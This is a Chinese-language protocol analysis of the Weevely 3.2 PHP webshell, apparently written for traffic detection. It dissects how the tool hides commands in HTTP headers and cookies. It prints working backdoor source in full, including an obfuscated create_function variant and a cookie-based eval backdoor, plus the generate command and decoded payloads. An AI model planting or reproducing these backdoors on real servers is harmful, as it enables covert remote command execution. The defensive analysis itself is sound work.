# <center>Weevely webshell协议分析文档</center> #
### <center>版本\<3.2\></center> ###
|环境|版本|
|--------|-----|
|虚拟机|版本：\<kali 4.6\>|
|weevely工具|版本：\<weevely 3.2\>|
|协议分析文档|日期：\<2016-9-23\>|

## 修订历史记录 ##
|日期|版本|说明|作者|
|---|---|---|----|
|2016/09/19|\<1.0\>|Weevely webshell协议分析文档|Yaof|
## 目录 ##
1.&emsp;&emsp;简介<br>&emsp;&emsp;1.1&emsp;&emsp;目的<br>&emsp;&emsp;1.2&emsp;&emsp;范围<br>&emsp;&emsp;1.3&emsp;&emsp;定义、首字母缩写词和缩略语<br>&emsp;&emsp;1.4&emsp;&emsp;参考资料<br>&emsp;&emsp;1.5&emsp;&emsp;概述<br>&emsp;&emsp;1.6&emsp;&emsp;解码方法<br>
2.&emsp;&emsp;协议简介<br>&emsp;&emsp;2.1&emsp;&emsp;协议分析范围<br>&emsp;&emsp;2.2&emsp;&emsp;定义（术语、名词解释）<br>
3.&emsp;&emsp;协议交互流程<br>
4.&emsp;&emsp;数据包格式<br>&emsp;&emsp;4.1&emsp;&emsp;stegaref_php.tpl模板<br>&emsp;&emsp;&emsp;&emsp;4.1.1&emsp;&emsp;请求包<br>&emsp;&emsp;&emsp;&emsp;4.1.2&emsp;&emsp;响应包<br>&emsp;&emsp;4.2&emsp;&emsp;legacycookie_php.tpl模板<br>&emsp;&emsp;&emsp;&emsp;4.2.1&emsp;&emsp;请求包<br>&emsp;&emsp;&emsp;&emsp;4.2.2&emsp;&emsp;响应包<br>
5.&emsp;&emsp;数据包载荷分析<br>&emsp;&emsp;5.1&emsp;&emsp;weevely数据包(stegaref_php.tpl模块)分析<br>&emsp;&emsp;&emsp;&emsp;5.1.1&emsp;&emsp;weevely webshell控制通道原理<br>&emsp;&emsp;&emsp;&emsp;5.1.2&emsp;&emsp;核心函数send（）流程分析<br>&emsp;&emsp;&emsp;&emsp;5.1.3&emsp;&emsp;\_prepare（）函数分析<br>&emsp;&emsp;&emsp;&emsp;5.1.4&emsp;&emsp;解密payload<br>&emsp;&emsp;&emsp;&emsp;5.1.5&emsp;&emsp;响应体数据分析<br>&emsp;&emsp;5.2&emsp;&emsp;weevely数据包(legacycookie模块)分析<br>&emsp;&emsp;&emsp;&emsp;5.2.1&emsp;&emsp;legacycookie_php.tpl模板数据包解密payload<br>&emsp;&emsp;&emsp;&emsp;5.2.2&emsp;&emsp;响应体分析<br>
6.&emsp;&emsp;weevely验证机制分析<br>&emsp;&emsp;6.1&emsp;&emsp;源码分析<br>&emsp;&emsp;6.2&emsp;&emsp;PHP(stegaref_php.tpl模板)后门文件分析<br>&emsp;&emsp;6.3&emsp;&emsp;PHP(legacycookie_php.tpl模板)后门文件分析<br>&emsp;&emsp;6.4&emsp;&emsp;验证连接是否成功<br>
7.&emsp;&emsp;weevely数据特征提取<br>&emsp;&emsp;7.1&emsp;&emsp;stegaref_php.tpl模板特征<br>&emsp;&emsp;7.2&emsp;&emsp;legacycookie_php.tpl模板特征模板特征<br>
## 1.&emsp;简介 ##
### 1.1&emsp;目的 ###
&emsp;&emsp;&emsp;描述weevely工具协议的流程及数据包结构。
### 1.2&emsp;范围 ###
&emsp;&emsp;&emsp;略。
### 1.3&emsp;定义、首字母缩写词和缩略语 ###
&emsp;&emsp;&emsp;略。
### 1.4&emsp;参考资料 ###
&emsp;&emsp;&emsp;[守望者实验室：weevely样本后门特征分析](http://www.sec-un.org/webshell-security-testing-4-characteristic-analysis-of-sample-weevely-backdoor.html "http://www.sec-un.org/webshell-security-testing-4-characteristic-analysis-of-sample-weevely-backdoor.html").<br />
&emsp;&emsp;&emsp;[启明星辰实验室：weevely黑客工具分析](http://www.wtoutiao.com/p/1b0gMD1.html "http://www.wtoutiao.com/p/1b0gMD1.html").<br />
&emsp;&emsp;&emsp;[PHP后门生成工具Weevely分析](http://www.i0day.com/749.html "http://www.i0day.com/749.html").<br />
&emsp;&emsp;&emsp;[freebuf：Weevely(PHP菜刀)工具使用详解](http://www.sec-un.org/webshell-security-testing-4-characteristic-analysis-of-sample-weevely-backdoor.html "http://www.sec-un.org/webshell-security-testing-4-characteristic-analysis-of-sample-weevely-backdoor.html").<br />
### 1.5&emsp;概述 ###
&emsp;&emsp;&emsp;Weevely采用HTTP协议进行通信，本文档仅针对Weevely连接PHP后门文件所发送的数据包进行分析。
### 1.6&emsp;解码方法 ###
&emsp;&emsp;&emsp;对base64编码进行解码,在python27命令行下：<br>&emsp;&emsp;&emsp;<code>import base64</code><br>&emsp;&emsp;&emsp;<code>base64.b64decode(‘’)</code>
## 2.&emsp;协议分析 ##
### 2.1&emsp;协议分析范围 ###
* 服务器配置审计
* 后门放置
* 暴力破解
* 文件管理
* 资源搜索
* 网络代理
* 命令执行
* 系统信息收集
* 端口扫描等功能分析

### 2.2&emsp;定义（术语、名词解释） ###
&emsp;&emsp;&emsp;客户端：运行Weevely进程的计算机。<br>
&emsp;&emsp;&emsp;服务端：存有PHP木马的服务器。
## 3.&emsp;协议交互流程 ##
&emsp;&emsp;&emsp;在客户端，Weevely每执行一条命令就通过HTTP协议发出一条GET/POST请求；在服务端，木马针对每条GET/POST请求作出响应，产生一条响应包。
## 4.&emsp;数据包格式 ##
&emsp;&emsp;&emsp;通过对源代码进行走读，可以看出Weevely主要生成的php后门文件主要有三种模板：stegaref_php.tpl，legacycookie_php.tpl，stegaref_php_debug.tpl。其中stegaref_php.tpl与stegaref_php_debug.tpl两种php模板类似，主要特点是返回的response_body中的标签stegaref_php.tpl为"<连接密码md5加密前八位></连接密码md5加密前八位>"，stegaref_php_debug.tpl为："<连接密码md5加密前八位+DEBUG></连接密码md5加密前八位+DEBUG>",同时响应体中的内容stegaref_php_debug.tpl模板把主要的有用数据字段全都显示出来了，主要用于前期debug使用，所以本文档主要分析了stegaref_php.tpl和legacycookie_php.tpl两种使用模板。
### 4.1&emsp;stegaref_php.tpl模板 ###
&emsp;&emsp;&emsp;以ip为136的kali虚拟机为客户端对含有后门文件的ip为137的kali虚拟机作为服务器进行远程连接。连接成功后在客户端命令行中输入命令whoami查看回显内容。通过Wireshark我们抓取到了两个TCP数据流。分别为：<br>
#### 4.1.1&emsp;请求包 ####
|数据包|分析|
|----|----|
|GET /backdoor.php HTTP/1.1<br>Accept-Encoding: identity<br><font color=red>Accept-Language: uk-UA,mi;q=0.5,mt;q=0.7,mk;q=0.8</font><br>Host: 192.168.182.137<br>Accept: text/html,text/plain;0.9,*/*<br>User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.1 (KHTML, like Gecko) Chrome/6.0.427.0 Safari/534.1<br>Connection: close<br><font color=red>Referer: http://www.google.bt/url?sa=t&rct=j&q=168.182.137&source=web&cd=799&ved=bd6Tfh__3&url=168.182&ei=z5HrNlsxt6GOIdThqz-xn9&usg=_WO2gRIcnxgee6zgNBv-_H_-rGFUhmIHND</font><br>|HTTP攻击载荷主要存储于<font color=red>Referer</font>头中,通过<font color=red>Accept-Language</font>头中存储的sessionid和payload的数组偏移量对加密的payload进行提取。|

|数据包|分析|
|----|----|
|GET /backdoor.php HTTP/1.1<br>Accept-Encoding: identity<br><font color=red>Accept-Language: ur-PK,mh;q=0.4</font><br>Connection: close<br>Accept: text/html,application/xml;0.9,*/*<br>User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.4) Gecko/20060508 Firefox/1.5.0.4<br>Host: 192.168.182.137<br>Cookie: PHPSESSID=fkdt4fv5tkn3q2hnhp10rv65o5<br><font color=red>Referer: http://translate.googleusercontent.com/translate_c?depth=1&rurl=translate.google.com&sl=auto&tl=en&usg=hiNRM7PjQ220tyDdwupmXEp1ZrLJkF0aFf</font><br>|HTTP攻击载荷主要存储于<font color=red>Referer</font>头中,通过<font color=red>Accept-Language</font>头中存储的sessionid和payload的数组偏移量对加密的payload进行提取。|

&emsp;&emsp;&emsp;通过对Weevely源码进行分析，确定数据包格式主要通过7种不同的构造Referer数据报头方法进行对加密的payload进行填充。Referer头格式为：<br>

* **http://www.google.${ tpl.rand_google_domain() }/url?sa=t&rct=j&q=${ tpl.target_name() }&source=web&cd=${ tpl.rand_number(3) }&ved=${ tpl.payload_chunk(9) }&url=${ tpl.target_name() }&ei=${ tpl.payload_chunk(22) }&usg=${ tpl.payload_chunk(34) }**
* **http://www.google.${ tpl.rand_google_domain() }/url?sa=t&rct=j&q=${ tpl.target_name() }&source=web&cd=${ tpl.rand_number(3) }&ved=${ tpl.payload_chunk(9) }&url=${ tpl.target_name() }&ei=${ tpl.payload_chunk(22) }&usg=${ tpl.payload_chunk(34) }&sig2=${ tpl.payload_chunk(22) }**
* **http://translate.googleusercontent.com/translate_c?depth=1&rurl=translate.google.com&sl=auto&tl=en&u=${ tpl.target_name() }&usg=${ tpl.payload_chunk(34) }**
* **http://${ tpl.get_url_base() }/?${ tpl.rand_chars(2) }=${ tpl.payload_chunk(30,20) }&${ tpl.rand_chars(2) }=${ tpl.payload_chunk(30,20) }**
* **http://${ tpl.get_url_base() }/?${ tpl.rand_chars(3) }=${ tpl.payload_chunk(30,20) }**
* **http://${ tpl.get_url_agent() }?${ tpl.rand_chars(2) }=${ tpl.payload_chunk(30,20) }&${ tpl.rand_chars(2) }=${ tpl.payload_chunk(30,20) }**
* **http://${ tpl.get_url_agent() }?${ tpl.rand_chars(3) }=${ tpl.payload_chunk(30,20) }**

#### 4.1.2&emsp;响应包 ####
|数据包|分析|
|----|----|
|HTTP/1.1 200 OK<br>Date: Mon, 19 Sep 2016 07:13:56 GMT<br>Server: Apache/2.4.23 (Debian)<br>Set-Cookie: PHPSESSID=fkdt4fv5tkn3q2hnhp10rv65o5; path=/<br>Expires: Thu, 19 Nov 1981 08:52:00 GMT<br>Cache-Control: no-store, no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 0<br>Connection: close<br>Content-Type: text/html; charset=UTF-8|这一部分响应包中主要显示了响应头的基本信息，没有什么特殊的有用信息。|

|数据包|分析|
|----|----|
|HTTP/1.1 200 OK<br>Date: Mon, 19 Sep 2016 07:13:56 GMT<br>Server: Apache/2.4.23 (Debian)<br>Expires: Thu, 19 Nov 1981 08:52:00 GMT<br>Cache-Control: no-store, no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 45<br>Connection: close<br>Content-Type: text/html; charset=UTF-8<br><br><font color=red><5d41402a>TfgfHhvnfygZLdAzNCHtYgI=</5d41402a></font>|攻击载荷返回结果存储于响应体中，响应体具体返回结果通过"<5d41402a></5d41402a>"标签封装。|

&emsp;&emsp;&emsp;<5d41402a></5d41402a>标签中"5d41402a"是php后门文件的连接密码"hello"通过代码：<code>**shared_key = hashlib.md5(password).hexdigest().lower()[:8]**</code>执行得出。即shared_key为连接密码进行MD5加密取其前八位。标签内的内容为攻击载荷具体返回值:"TfgfHhvnfygZLdAzNCHtYgI="具体内容经过解密（先base64解码，再和shared_key进行异或，最后通过zip解压缩）<code>zlib.decompress(utils.strings.sxor(base64.urlsafe_b64dncode(payload), shared_key))</code>得到返回值："www-data"。
真实的payload被经过多重编码后分散在报文的各个部分，我们需要对weevely的源码进行解析，然后对加密后的payload进行解密提取有用的价值。

### 4.2&emsp;legacycookie_php.tpl模板 ###
&emsp;&emsp;&emsp;通过用Wireshark进行数据包的捕获。
#### 4.2.1&emsp;请求包 ####
|数据包|分析|
|------|---|
|GET /test.php HTTP/1.1<br>Accept-Encoding: identity<br>Host: 192.168.182.137<br><font color=red>Cookie: USR=he; APISID=-Y2\*hka?XI/oJy9-2YXIv; USRID=d3@d3L2h0b-W-wn-K&TtA; SESS=c-3\*lzdGV-tK-C-d3aG9hbWkgMj4mM#Sc\*pO-w==</font><br>Connection: close<br>User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; fr-FR)AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16<br>|攻击载荷主要存在于Cookie头中，Cookie中的payload主要通过base64编码加密，加密后的payload通过进行拆分，同时通过<code>#&*-/?@~</code>这些特殊字符串进行混淆。|

&emsp;&emsp;&emsp;通过对Weevely源码进行分析，可以看到对cookie中的payload进行拆分的数组主要由<code>default_prefixes = ["ID", "SID", "APISID","USRID", "SESSID", "SESS","SSID", "USR", "PREF"]</code>这几个数组组成。payload通过代码：<code>payload = base64.b64encode(original_payload.strip())</code>对payload进行base64编码加密。Cookie中第一个字符串："USR=he;"其中"he"为连接密码前两位。
#### 4.2.2&emsp;响应包 ####
|数据包|分析|
|------|---|
|HTTP/1.1 200 OK<br>Date: Tue, 20 Sep 2016 01:39:18 GMT<br>Server: Apache/2.4.23 (Debian)<br>Content-Length: 20<br>Connection: close<br>Content-Type: text/html; charset=UTF-8<br><br><font color=red>\<llo>www-data\</llo></font>|攻击载荷返回结果存储于响应体中，响应体具体返回结果通过"\<llo>\</llo>"标签封装。|

&emsp;&emsp;&emsp;响应包标签"\<llo>\</llo>"中"llo"通过对php代码进行分析可知:<code>$k="${password[2:]}";</code>为连接密码第三位至末尾字符串。攻击载荷返回结果即为\<llo>\</llo>标签中的返回值。
## 5.&emsp;数据包载荷分析 ##
### 5.1&emsp;weevely数据包(stegaref_php.tpl模块)分析 ###
#### 5.1.1&emsp;weevely webshell控制通道原理 ####
&emsp;&emsp;&emsp;weevely使用了python中的cmd模块实现交互会话，交互会话的命令有两部分：<br>
1. modules目录中包含了一部分命令的实现，例如weevely3/modules/file/目录实现了cd，cp等命令
2. 对于modules中没有定义的命令，weevely会使用system函数直接执行用户输入命令。
weevely在建立连接的时候会从服务器上获取web根目录的绝对路径，因此whoami命令，在最终会生成：
“chdir('/var/www/html');@system('whoami 2>&1')；”<br>
其中，**stegaref.py**为核心代码区域，**referrers.tpl**为mako模板，weevely根据这个模板编码攻击payload。<br>
编码后的payload在HTTP的Referer和Accept-Language中，其中Accept-Language用于指示payload在referer中的偏移位置，在我们抓取到的数据包中，原始payload<code><font color=red>chdir('/var/www/html');@system('whoami 2>&1')；</font></code>将会被编码为：<code><font color=red>Accept-Language: uk-UA,mi;q=0.5,mt;q=0.7,mk;q=0.8</font></code><br><code><font color=red>Referer: http://www.google.bt/url?sa=t&rct=j&q=168.182.137&source=web&cd=799&ved=bd6Tfh__3&url=168.182&ei=z5HrNlsxt6GOIdThqz-xn9&usg=_WO2gRIcnxgee6zgNBv-_H_-rGFUhmIHND</font></code><br>和<code><font color=red>Accept-Language: ur-PK,mh;q=0.4</font></code><br><code><font color=red>Referer: http://translate.googleusercontent.com/translate_c?depth=1&rurl=translate.google.com&sl=auto&tl=en&usg=hiNRM7PjQ220tyDdwupmXEp1ZrLJkF0aFf</font></code><br>

#### 5.1.2&emsp;核心函数send（）流程分析 ####
1. <code>**session_id, referrers_data = self._prepare(original_payload)**</code>调用_prepare函数对原始payload进行编码，生成承载编码后的payload的referer数组，由于payload可能很长，因此可能生成多个referer。
2. <code>**for referrer_index, referrer_data in enumerate(referrers_data):accept_language_header = self._generate_header_accept_language**</code>调用_generate_header_accept_language（）函数生成对应的Accept-Language。其中q=0.5，q=0.7，q=0.8以及q=0.4分别代表payload在referer数组中的偏移量。
3. 生成其他的http header，发送payload给webshell。
#### 5.1.3&emsp;_prepare（）函数分析 ####
1. 函数原型：<code>**def \_prepare(self, payload):**</code>这里的payload还为原始的payload
2. payload加密函数：<code>**obfuscated_payload = base64.urlsafe_b64encode(utils.strings.sxor(zlib.compress(payload),self.shared_key)).rstrip('=')**</code>,首先对原始payload进行编码，zip压缩后和shared_key进行异或运算，最后进行base64编码，注意这里的shared_key，这个key非常重要，生成的算法很简单：<code>**shared_key = hashlib.md5(password).hexdigest().lower()[:8]**</code>其中password就是webshell的密码，这里的是hello。<br>
3. _prepare()函数不仅仅对payload进行加密，同时也随机生成了sessionid（占两个字节），这个sessionid在_generate_header_accept_language（）函数中被分解为多个字符串，即为Accept-Language中的uk-UA,mi;mt;mk;对于我们有用的就是uk-UA的第一个字符和mi，mt，mk的第一个字符，所以可以看出我们的sessionid为um。
4. 通过代码<code>**header = hashlib.md5(session_id +self.shared_key[:4]).hexdigest().lower()[:3]**</code><br>和<code>**header = hashlib.md5(session_id +self.shared_key[4:8]).hexdigest().lower()[:3]**</code>生成header和footer，而header和footer顾名思义用于指示编码后的payload的开始位置和结束位置。由于session_id上述说明了为um，所以对应的header和footer分别为‘bd6’和‘220’。
5. 首先通过数组的偏移量可以找到大致的payload为：<code>**bd6Tfh__3z5HrNlsxt6GOIdThqz-xn9_WO2gRIcnxgee6zgNBv-_H\_-rGFUhmIHNDhiNRM7PjQ220tyDdwupmXEp1ZrLJkF0aFf**</code><br>然后通过代码<code>**remaining_payload=header+obfuscated_payload+footer**</code><br>header和footer找出具体payload的值:<code> **Tfh__3z5HrNlsxt6GOIdThqz-xn9_WO2gRIcnxgee6zgNBv-_H\_-rGFUhmIHNDhiNRM7PjQ**</code>
6. <code>**for referrer_index, referrer_vanilla_data in enumerate(itertools.cycle(self.referrers_vanilla)):**</code>该代码为一个无限循环，这个循环将开始填充remaining_payload，这个循环有一个重要的参数，self.referrers_vanilla,这个参数是从referrers.tpl中读取并render（）之后得到的，我们的数据包中可以看出使用了两模板：<br><code>**http://www.google.${ tpl.rand_google_domain() }/url?sa=t&rct=j&q=${ tpl.target_name() }&source=web&cd=${ tpl.rand_number(3) }&ved=${ tpl.payload_chunk(9) }&url=${ tpl.target_name() }&ei=${ tpl.payload_chunk(22) }&usg=${ tpl.payload_chunk(34) }**</code><br>和<code> **http://translate.googleusercontent.com/translate_c?depth=1&rurl=translate.google.com&sl=auto&tl=en&u=${ tpl.target_name() }&usg=${ tpl.payload_chunk(34) }**</code>

#### 5.1.4&emsp;解密payload ####
&emsp;&emsp;&emsp;通过上文对payload进行提取可知，加密后的payload为：<code>**Tfh__3z5HrNlsxt6GOIdThqz-xn9_WO2gRIcnxgee6zgNBv-_H\_-rGFUhmIHNDhiNRM7PjQ**</code>通过他的加密函数<code>**obfuscated_payload = base64.urlsafe_b64encode(utils.strings.sxor(zlib.compress(payload),self.shared_key)).rstrip('=')**</code>可以对算法进行逆向解密（先base64解密，shared_key异或，zip解压缩）可得算法为：<code> **zlib.decompress(utils.strings.sxor(base64.urlsafe_b64dncode(payload), shared_key))**</code>,由于payload进行加密时通过rstrip('=')把等于号全部删除掉了，所以在进行解密时当算法出错时可以向字符串末尾添加"="号结合算法进行解密，函数通过算法解密后可得到攻击载荷为："chdir('/var/www/html');@system('whoami 2>&1')；"。
#### 5.1.5&emsp;响应体数据分析 ####
&emsp;&emsp;&emsp;通过对数据包的提取，我们可以看到weevely的具体响应内容在响应体中显示：<br><code><font color=red><5d41402a>TfgfHhvnfygZLdAzNCHtYgI=</5d41402a></font></code>。

1. 观察可见具体的回显数据被封装在<code><5d41402a></5d41402a></code>标签中，而标签里的内容为"5d41402a"，这个数据的由来是后门php文件连接密码"hello"通过<code>**shared_key = hashlib.md5(password).hexdigest().lower()[:8]**</code>这个函数进行MD5加密然后取前8位。
2. 具体回显内容为"TfgfHhvnfygZLdAzNCHtYgI=",该加密字符串主要的加密方式为先进行zip压缩后和shared_key做异或运算，然后再进行base64编码，通过算法<code><font color=red>decompress(utils.strings.sxor(base64.b64decode(response_body), shared_key))</font></code>进行解密运算，得到命令"whoami"的执行结果："www-data"。

### 5.2&emsp;weevely数据包(legacycookie模块)分析 ###
#### 5.2.1&emsp;legacycookie_php.tpl模板数据包解密payload ####
1. legacycookie_php.tpl模板如图3.1所示：<br>![Alt text](/picture/cookie_php.png)<br><center>图 3.1 </center><br>通过模板的php代码可以知道，用这个模板进行攻击的payload主要的加密方式为base64编码加密，所以payload只需要进行base64解码即可。
2. payload片段分别放在Cookie字段中存储，通过代码<code> **self.default_prefixes = ["ID", "SID", "APISID","USRID", "SESSID", "SESS","SSID", "USR", "PREF"]**</code>可知，Cookie中的USR，APISID等字符串主要从该数组中随机取出。
3. <code> **additional_headers.append(('Cookie', '%s=%s;%s %s' % (prefixes.pop(),self.password[:2],additional_cookie if additional_cookie else '',cookie_payload_string)))**</code>代码中可以看到构造的Cookie第一个字符串是"self.password[:2]"即密码的前两位，后面的即为真正的payload，所以我们可以直接把payload进行拼接，然后手工去掉特殊字符，再进行base64解密就可以得到完整的payload。从数据包中提取的payload为"Y2hkaXIoJy92YXIvd3d3L2h0bWwnKTtAc3lzdGVtKCd3aG9hbWkgMj4mMScpOw=="进行base64解码后得到真正的payload为"chdir('/var/www/html');@system('whoami 2>&1');"

#### 5.2.2&emsp;响应体分析 ####
&emsp;&emsp;&emsp;使用legacycookie_php.tpl模板的php后门文件抓取的数据包响应体为明文数据，可以通过观察直观的看到我们攻击命令的回应信息。回应信息主要放在<code><font>\<llo>\</llo></font></code>标签中。而标签中的内容"llo"通过跟踪代码` $k="${password[2:]}";echo "<$k>";echo "</$k>";`可以知道"llo"为是php文件密码从第三个字符一直取到末尾得到。
## 6&emsp;weevely验证机制分析 ##
### 6.1&emsp;源码分析 ###
&emsp;&emsp;&emsp;当生成的php文件是以stegaref_php.tpl文件为模板时，当我们在连接时的命令行中输入任意命运就可以触发**php.py**文件中的**_check_interpreter()**函数，_check_interpreter()函数主要功能是随机生成一个命令，"echo"一个从11111到99999大小的随机整数，然后分别调用channels文件夹下的channel.py文件中的"send()"函数，然后在send()函数中把payload分别发送给legacycookie.py，legacyreferrer.py和stegaref.py三个Python文件中的"send()"函数同时返回Response，code，error的值，<code> **response, code, error = channel.send(command)**</code>,通过对返回的Response和构造的echo的随机数是否相等来进行判断PHP shell能否直接运行，同时判断连接是否成功。
### 6.2&emsp;PHP(stegaref_php.tpl模板)后门文件分析 ###
&emsp;&emsp;&emsp;首先，当我们使用命令：<code><font color=red>weevely generate hello /var/www/html/testformd.php</font></code>来生成木马文件时，会调用generate()函数来生成木马。

1. generate()函数在weevely3-master/core/generate.py文件中，函数原型为：<code> **def generate(password, obfuscator = 'obfusc1_php', agent = 'stegaref_php'):**</code>其中，password为用户指定的密码， obfuscator是使用的webshell模糊变换模板，agent为webshell的模板，后两个参数均可自己定义，用户可以自己编写自定义的模板放入weevely3-master/bd/obfuscator/和weevely3-master/bd/agent/目录下，然后命令中指定自定义的模板。
2. <code> **agent = Template(open(agent_path,'r').read()).render(password=password)**</code>render agent模板文件，得到原始的webshell。webshell源码通过pycharm debug出来，生成的源码为:<br>
        $kh="5d41";
		$kf="402a";

		function x($t,$k){
			$c=strlen($k);
			$l=strlen($t);
			$o="";
			for($i=0;$i<$l;){
				for($j=0;($j<$c&&$i<$l);$j++,$i++)
				{
					$o.=$t{$i}^$k{$j};
				}
			}
			return $o;
		}

		$r=$_SERVER;
		$rr=@$r["HTTP_REFERER"];
		$ra=@$r["HTTP_ACCEPT_LANGUAGE"];

		if($rr&&$ra){
		    $u=parse_url($rr);
		    parse_str($u["query"],$q);
			$q=array_values($q);
			preg_match_all("/([\w])[\w-]+(?:;q=0.([\d]))?,?/",$ra,$m);

			if($q&&$m){
				@session_start();

				$s=&$_SESSION;
				$ss="substr";
				$sl="strtolower";

				$i=$m[1][0].$m[1][1];
				$h=$sl($ss(md5($i.$kh),0,3));
				$f=$sl($ss(md5($i.$kf),0,3));

				$p="";
				for($z=1;$z<count($m[1]);$z++) $p.=$q[$m[2][$z]];

				if(strpos($p,$h)===0){
					$s[$i]="";
					$p=$ss($p,3);
				}

				if(array_key_exists($i,$s)){

					$s[$i].=$p;

					$e=strpos($s[$i],$f);
					if($e){
						$k=$kh.$kf;
						ob_start();
						@eval(@gzuncompress(@x(@base64_decode(preg_replace(array("/_/","/-/"),array("/","+"),$ss($s[$i],0,$e))),$k)));
						$o=ob_get_contents();
						ob_end_clean();
						$d=base64_encode(x(gzcompress($o),$k));
						print("<$k>$d</$k>");
						@session_destroy();
					}
				}
			}
		}
3. <code> **minified_agent = utils.code.minify_php(agent)**</code>对原始的webshell进行"净化"操作，去除里面"\n\t"等特殊字符。处理完的源码为：<br>

		$kh="5d41";$kf="402a";function x($t,$k){$c=strlen($k);$l=strlen($t);$o="";for($i=0;$i<$l;){for($j=0;($j<$c&&$i<$l);$j++,$i++){$o.=$t{$i}^$k{$j};}}return $o;}$r=$_SERVER;$rr=@$r["HTTP_REFERER"];$ra=@$r["HTTP_ACCEPT_LANGUAGE"];if($rr&&$ra){$u=parse_url($rr);parse_str($u["query"],$q);$q=array_values($q);preg_match_all("/([\w])[\w-]+(?:;q=0.([\d]))?,?/",$ra,$m);if($q&&$m){@session_start();$s=&$_SESSION;$ss="substr";$sl="strtolower";$i=$m[1][0].$m[1][1];$h=$sl($ss(md5($i.$kh),0,3));$f=$sl($ss(md5($i.$kf),0,3));$p="";for($z=1;$z<count($m[1]);$z++)$p.=$q[$m[2][$z]];if(strpos($p,$h)===0){$s[$i]="";$p=$ss($p,3);}if(array_key_exists($i,$s)){$s[$i].=$p;$e=strpos($s[$i],$f);if($e){$k=$kh.$kf;ob_start();@eval(@gzuncompress(@x(@base64_decode(preg_replace(array("/_/","/-/"),array("/","+"),$ss($s[$i],0,$e))),$k)));$o=ob_get_contents();ob_end_clean();$d=base64_encode(x(gzcompress($o),$k));print("<$k>$d</$k>");@session_destroy();}}}}
4. <code> **obfuscated = obfuscator_template.render(agent=agent)**</code>这是最核心的代码，使用obfuscator模板对webshell进行"模糊处理"，去除容易被检测的特征。模糊处理完的文件源码为：<br>

		<?php
		$s='d5($R$i.$$Rkh),0,3));$R$f=$sl$R($ss(m$Rd5$R($i.$kf),0,3$R));$p$R$R="";for($R$z=1;$R$z<count($R$m[1]);$z$R++)$p.=$R$q[$m[$R';
		$H='$Rses$Rsion_st$Rart();$s=&$_SES$RSION;$ss="$Rsub$Rs$Rtr";$sl="str$Rtolower$R";$i$R=$m[1$R][0]$R.$m[1][1];$R$h=$R$sl($ss($Rm';
		$u='g_replac$Re(arr$Ray$R("/_/","/$R-/"),arr$Ray$R("/","+"$R),$$Rss($s[$i],0$R,$e)$R))$R,$k)));$$Ro=ob_$Rget_$Rcontents($R);ob_';
		$V='$kh="$R5d41";$R$kf="402$Ra$R$R";function x($t,$$Rk){$c=st$Rr$Rlen($k);$l=st$Rrlen$R($t)$R;$o="";for$R($$Ri=0;$i<$$Rl;){$Rfor';
		$E=';$R$q=a$Rrray_valu$Res($q);$Rpr$Reg_match$R_all("/($R[\\w])[$R\\w-]+(?:;$Rq=0$R.([\\d$R]))?$R,?/",$ra$R,$m);if($$Rq$R&&$m)$R{@';
		$c='($j=$R0;($j<$R$c&&$R$$Ri<$R$l);$j++$R,$$Ri++){$o.=$t{$i$R}^$k{$j}$R;}}return$R $R$o$R;}$r=$_SERVER;$$Rrr=@$r[$R"HT$RTP_REFER';
		$F='R$$Re=$Rstr$Rpos($s[$i],$f);if($R$e){$k=$k$Rh$R.$kf;ob_$Rsta$Rrt()$R;@ev$Ral(@gzuncom$Rpress(@x($R@bas$Re64_$Rdecode(pr$Re';
		$P='$RER"];$$Rra=@$r["H$RTTP_AC$RCE$RPT_LA$RNGUAGE$R"];if($r$Rr&&$ra){$R$u=pars$Re$R_ur$Rl($rr);par$Rs$Re_str($$Ru["query"]$R,$q)';
		$R='end_c$Rlean$R();$d=$Rbase$R64_en$Rcode(x(gzc$Rompress$R$R($o)$R,$k));pri$Rnt($R"<$R$$Rk>$R$d</$k>");@sessi$Ron_destroy();}}}}';
		$f='2][$R$z$R]];if(s$Rtrpos($p$R,$R$h)===0){$s[$i$R]="";$$Rp=$R$ss($p,3)$R;}if(arr$R$Ray_$Rkey_exists($i,$R$s$R)){$s[$i$R].=$p;$';
		$U=str_replace('iV','','creiViVaiViVte_funciVtiiVon');
		$X=str_replace('$R','',$V.$c.$P.$E.$H.$s.$f.$F.$u.$R);
		$O=$U('',$X);$O();
		?>

5. 通过对最具有格式且没有经过模糊处理的php文件进行源码走读，可以看出，文件中存在"$kh=5d41"和"$kf=402a"这两个参数，这两个参数就是我们生成文件时的定义的密码经过md5加密后的前8位，分在两个参数中存储。<code> **$r=$_SERVER;$rr=@$r["HTTP_REFERER"];$ra=@$r["HTTP_ACCEPT_LANGUAGE"];**</code>从server中去取http协议请求头中的REFERER数据和ACCEPT_LANGUAGE数据，然后通过正则表达式<code> **preg_match_all("/([\\w])[\\w-]+(?:;q=0.([\\d]))?,?/",$ra,$m);**</code>去匹配ACCEPT_LANGUAGE中的数组偏移量。<code> **$h=$sl($ss(md5($i.$kh),0,3));$f=$sl($ss(md5($i.$kf),0,3));**</code>来求出真正有用的payload的header和footer。
<code> **@eval(@gzuncompress(@x(@base64_decode(preg_replace(array("/_/","/-/"),array("/","+"),$ss($s[$i],0,$e))),$k)));**</code>这个函数是用来解密payload，得到真正攻击的载荷命令。<br><code> **$d=base64_encode(x(gzcompress($o),$k));**</code>把执行结果通过相同的方式进行加密，放在自己密码加密后的标签中<code> **print("<$k>$d</$k>");**</code><br>

### 6.3&emsp;PHP(legacycookie_php.tpl模板)后门文件分析 ###
&emsp;&emsp;&emsp;weevely3中默认生成的文件是以stegaref_php.tpl为模板和以obfusc1_php.tpl为混淆模板来进行后门文件生成。可以在weevely.py文件中对这两个参数进行修改换成以legacycookie_php.tpl为模板和cleartext1_php.tpl为混淆模板生成配合php文件。<br>
**直接对源代码进行跟踪调试**<br>
1. <code> **agent = Template(open(agent_path,'r').read()).render(password=password)**</code>render agent模板文件，得到原始的webshell。webshell源码通过pycharm debug出来初始php代码为：<br>

		u'$c="count";
		$a=$_COOKIE;
		if(reset($a)=="he" && $c($a)>3){
		$k="llo";
		echo "<$k>";
		eval(base64_decode(preg_replace(array("/[^\\w=\\s]/","/\\s/"), array("","+"), join(array_slice($a,$c($a)-3)))));
		echo "</$k>";
		}
		'
